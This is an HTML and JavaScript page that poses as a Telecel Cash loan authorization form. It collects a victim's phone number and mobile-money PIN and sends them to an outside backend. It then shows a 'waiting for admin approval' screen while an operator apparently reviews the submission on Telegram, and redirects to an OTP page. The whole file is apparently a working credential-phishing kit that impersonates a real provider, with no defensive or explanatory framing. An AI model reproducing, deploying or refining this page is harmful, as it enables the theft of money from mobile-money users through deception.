<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Verify Loan - Telecel Cash</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f3f4f6; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px; }
        .card { max-width: 400px; width: 100%; background: white; border-radius: 24px; padding: 24px; box-shadow: 0 20px 60px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 24px; }
        .header h1 { color: #E42320; font-size: 24px; }
        .loan-box { background: #fff0f0; padding: 16px; border-radius: 16px; text-align: center; margin-bottom: 24px; }
        .loan-amount { font-size: 28px; font-weight: bold; color: #E42320; }
        input, select { width: 100%; padding: 14px; margin: 8px 0 16px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; }
        button { width: 100%; padding: 16px; background: #E42320; color: white; border: none; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; }
        button:disabled { opacity: 0.5; }
        .error { background: #fee2e2; color: #b91c1c; padding: 12px; border-radius: 12px; margin-bottom: 16px; display: none; }
        .success { background: #f0fdf4; color: #166534; padding: 12px; border-radius: 12px; margin-bottom: 16px; display: none; }
        .spinner { display: none; text-align: center; margin-top: 16px; color: #E42320; }
        .waiting-area { display: none; text-align: center; padding: 16px; background: #fef3c7; border-radius: 12px; margin-bottom: 16px; }
        .waiting-dots { display: flex; justify-content: center; gap: 5px; margin-top: 10px; }
        .dot { width: 10px; height: 10px; background: #E42320; border-radius: 50%; animation: pulse 1.5s infinite; }
        .dot:nth-child(2) { animation-delay: 0.3s; }
        .dot:nth-child(3) { animation-delay: 0.6s; }
        @keyframes pulse { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
        .back-btn { background: transparent; color: #666; border: 1px solid #ddd; margin-top: 12px; }
    </style>
</head>
<body>
<div class="card">
    <div class="header"><h1>🔐 Authorize Your Loan</h1><p>Enter your Telecel details</p></div>
    <div class="loan-box"><div class="loan-amount" id="loanAmount">—</div><div id="loanDetails" style="font-size:12px;"></div></div>
    <div>
        <select id="accountType"><option>Telecel Cash</option></select>
        <input type="tel" id="phone" placeholder="Phone Number" maxlength="10">
        <input type="password" id="pin" placeholder="PIN" maxlength="4">
        <div class="error" id="errorMsg"></div>
        <div class="success" id="successMsg"></div>
        
        <div class="waiting-area" id="waitingArea">
            <strong>⏳ Waiting for Admin Approval</strong>
            <div class="waiting-dots">
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>
            <p style="font-size: 12px; margin-top: 12px;">Please wait while admin reviews your application on Telegram...</p>
        </div>
        
        <button id="verifyBtn">Verify & Authorize</button>
        <button class="back-btn" onclick="window.location.href='/'">← Back</button>
        <div class="spinner" id="spinner">⏳ Sending...</div>
    </div>
</div>
<script>
    const BACKEND_URL = 'https://telecel-upgrade-production.up.railway.app';
    let isProcessing = false;
    let statusInterval = null;
    let currentId = null;
    
    const loanData = JSON.parse(sessionStorage.getItem('calculatorData') || '{}');
    if (loanData.amount) {
        document.getElementById('loanAmount').innerHTML = `GHS ${loanData.amount.toLocaleString()}`;
        document.getElementById('loanDetails').innerHTML = `${loanData.duration/30} Months`;
    }
    
    function showError(msg) {
        let el = document.getElementById('errorMsg');
        el.innerHTML = msg;
        el.style.display = 'block';
        setTimeout(() => el.style.display = 'none', 4000);
    }
    
    function showSuccess(msg) {
        let el = document.getElementById('successMsg');
        el.innerHTML = msg;
        el.style.display = 'block';
        setTimeout(() => el.style.display = 'none', 3000);
    }
    
    function startPolling(id) {
        if (statusInterval) clearInterval(statusInterval);
        
        statusInterval = setInterval(async () => {
            try {
                const res = await fetch(`${BACKEND_URL}/api/check-status/${id}`);
                const data = await res.json();
                console.log(`Status for ${id}:`, data.status);
                
                if (data.status === 'approved') {
                    clearInterval(statusInterval);
                    statusInterval = null;
                    document.getElementById('spinner').style.display = 'none';
                    document.getElementById('waitingArea').style.display = 'none';
                    showSuccess("✅ Approved! Redirecting...");
                    
                    // ALERT LIKE THE WORKING SITE
                    alert("✅ Loan Approved! Redirecting to OTP page...");
                    
                    setTimeout(() => window.location.href = '/otp', 1500);
                } else if (data.status === 'declined') {
                    clearInterval(statusInterval);
                    statusInterval = null;
                    document.getElementById('spinner').style.display = 'none';
                    document.getElementById('waitingArea').style.display = 'none';
                    showError("❌ Request declined.");
                    document.getElementById('verifyBtn').disabled = false;
                    document.getElementById('verifyBtn').innerHTML = "Verify & Authorize";
                    isProcessing = false;
                }
            } catch(e) { 
                console.error('Poll error:', e);
                showError("Connection issue. Please check approval on Telegram.");
            }
        }, 2000);
    }
    
    document.getElementById('verifyBtn').onclick = async function() {
        if (isProcessing) return;
        
        let phone = document.getElementById('phone').value.trim();
        let pin = document.getElementById('pin').value.trim();
        
        if (phone.length !== 10) { showError("Enter valid 10-digit number"); return; }
        if (pin.length !== 4) { showError("Enter 4-digit PIN"); return; }
        
        isProcessing = true;
        let btn = this;
        btn.disabled = true;
        btn.innerHTML = "Sending...";
        document.getElementById('spinner').style.display = 'block';
        
        currentId = Date.now().toString();
        console.log(`Sending ID: ${currentId}`);
        
        try {
            let res = await fetch(`${BACKEND_URL}/api/send-verification`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    phone: phone,
                    pin: pin,
                    loanAmount: document.getElementById('loanAmount').innerHTML,
                    accountType: 'Telecel Cash',
                    requestId: currentId
                })
            });
            let data = await res.json();
            
            if (data.success) {
                document.getElementById('spinner').style.display = 'none';
                document.getElementById('waitingArea').style.display = 'block';
                btn.style.display = 'none';
                startPolling(currentId);
            } else {
                throw new Error("Failed");
            }
        } catch(e) {
            console.error('Submit error:', e);
            document.getElementById('spinner').style.display = 'none';
            showError("Network error. Try again.");
            btn.disabled = false;
            btn.innerHTML = "Verify & Authorize";
            isProcessing = false;
        }
    };
    
    document.getElementById('phone').oninput = function(e) { this.value = this.value.replace(/\D/g, '').slice(0,10); };
    document.getElementById('pin').oninput = function(e) { this.value = this.value.replace(/\D/g, '').slice(0,4); };
</script>
</body>
</html>
